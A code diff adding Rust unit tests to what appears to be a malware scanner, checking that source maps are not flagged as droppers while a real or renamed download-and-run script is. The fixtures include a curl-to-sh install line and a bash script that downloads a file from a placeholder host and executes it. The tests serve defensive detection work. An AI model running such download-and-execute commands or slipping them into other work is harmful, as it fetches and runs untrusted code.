@@ -3543,6 +3543,90 @@ mod reconcile {
         );
     }
 
+    /// A one-line source map, as a bundler writes it: every original file is
+    /// one JSON string in `sourcesContent`.
+    fn source_map(sources: &[(&str, &str)]) -> String {
+        serde_json::json!({
+            "version": 3,
+            "file": "cli.js",
+            "sources": sources.iter().map(|(name, _)| *name).collect::<Vec<_>>(),
+            "sourcesContent": sources.iter().map(|(_, src)| *src).collect::<Vec<_>>(),
+            "names": [],
+            "mappings": "AAAA,SAAS;AACA",
+        })
+        .to_string()
+    }
+
+    /// The false High on two clean registry MCP servers (com.vibgrate/
+    /// ai-context `dist/cli.js.map`, dev.jasonpearson/auto-mobile
+    /// `dist/src/index.js.map`): a `curl … https://` in one function's help
+    /// text and an unrelated `execFileSync(<path>, …)` far below it are both
+    /// on line 1 of the map, and a same-line link needs no name.
+    fn cli_source() -> String {
+        let mut src = String::from(
+            "import { execFileSync } from 'child_process';\n\
+             export const HELP = 'Install the CLI: curl -fsSL https://example.com/install.sh | sh';\n",
+        );
+        for i in 0..150 {
+            src.push_str(&format!("export const k{i} = {i};\n"));
+        }
+        src.push_str(
+            "export function devices(adbPath: string) {\n  return execFileSync(adbPath, ['devices']).toString();\n}\n",
+        );
+        src
+    }
+
+    #[test]
+    fn a_source_map_is_not_a_dropper() {
+        let src = cli_source();
+        let map = source_map(&[("../src/cli.ts", &src)]);
+        assert_eq!(map.lines().count(), 1);
+        // Both ends still fire in the map as line observations.
+        assert!(fires("dist/cli.js.map", &map, "NET-012"));
+        assert!(fires("dist/cli.js.map", &map, "CODE-RUNFILE-001"));
+        assert_eq!(chained("dist/cli.js.map", &map, "DROPPER-CHAIN-001"), None);
+        // In the original source, 150 lines apart and sharing no name, they
+        // were never a chain.
+        assert!(fires("src/cli.ts", &src, "CODE-RUNFILE-001"));
+        assert_eq!(chained("src/cli.ts", &src, "DROPPER-CHAIN-001"), None);
+        // A map of a real download-and-run is not reported either: nothing
+        // in a source map runs. The compiled file it describes is scanned on
+        // its own, and there the dropper is the chain.
+        let dropper = "#!/bin/bash\n\
+            curl -fsSL \"https://get.example.net/i.sh\" -o \"$INSTALLER\"\n\
+            bash \"$INSTALLER\"\n";
+        let dropper_map = source_map(&[("../src/install.sh", dropper)]);
+        assert!(chains("dist/install.sh.map", &dropper_map).is_empty());
+        assert_eq!(
+            chained("dist/install.sh", dropper, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+    }
+
+    /// A file that only borrows the extension can still be run (`node
+    /// lib/x.map`, `python3 x.map`), so it is correlated like any other.
+    #[test]
+    fn a_dropper_named_like_a_source_map_is_still_a_chain() {
+        let dropper = "#!/bin/bash\n\
+            curl -fsSL \"https://get.example.net/i.sh\" -o \"$INSTALLER\"\n\
+            bash \"$INSTALLER\"\n";
+        assert_eq!(
+            chained("lib/x.map", dropper, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+        // A real map on the first line and the dropper after it: not JSON as
+        // a whole, so not a source map.
+        let smuggled = format!(
+            "{}\n{}",
+            source_map(&[("../src/cli.ts", &cli_source())]),
+            GUARDRAILS
+        );
+        assert_eq!(
+            chained("lib/x.map", &smuggled, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+    }
+
     /// A login helper that opens a credential file for *writing* and then
     /// calls the auth endpoint writes the response into the file: the data
     /// flows network → file. Binding the write handle made this an
